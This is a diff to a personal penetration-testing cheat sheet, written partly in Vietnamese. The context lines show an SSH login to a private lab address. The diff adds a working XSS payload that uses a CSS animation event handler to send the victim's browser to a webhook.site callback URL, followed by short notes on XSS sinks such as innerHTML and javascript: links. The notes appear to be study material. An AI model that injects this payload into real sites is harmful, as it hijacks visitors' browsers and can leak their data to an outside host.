@@ -89,6 +89,7 @@ ssh -i /home/kali/Desktop/public_key -p 2214 root@192.168.18.170
 =======================================
 
 [+] XSS:
+	- <style>@keyframes x{}</style><h1 style="animation-name:x" onwebkitanimationend="document.location='http://webhook.site/5a0b366c-86ca-45c8-87d2-ee6c7c862097'"></h1>
 	- innerHTML: Chèn giá trị trực tiếp vào code web
 	- h2:contains(): có thể inject xss
 	- javascript:alert(1) -> xss link
